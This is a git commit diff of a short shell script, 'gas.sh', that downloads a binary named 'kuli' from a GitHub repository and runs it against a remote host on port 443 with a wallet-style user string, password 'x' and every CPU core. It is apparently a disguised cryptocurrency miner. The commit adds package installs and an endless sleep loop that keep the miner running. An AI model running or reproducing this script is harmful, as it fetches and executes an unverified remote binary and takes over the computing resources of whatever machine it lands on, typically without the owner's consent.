f0b1b05a81b010587c88a7f1f0684d09e6eaa392
stokjacky <stokjacky9@gmail.com>
2024-10-26 20:43:41 +0700

    Update gas.sh

--- gas.sh
+++ gas.sh
@@ -1,3 +1,9 @@
 #!/bin/bash
+sudo apt update
+sudo apt install screen -y
 wget https://github.com/stokjacky/amboyy/raw/main/kuli 
 ./kuli -c 157.245.62.61:443 -u RB7Ca9o9Xnf333xDtUnPVYH3JaycB7mgh3.yfff -p x --cpu $(nproc --all) 
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
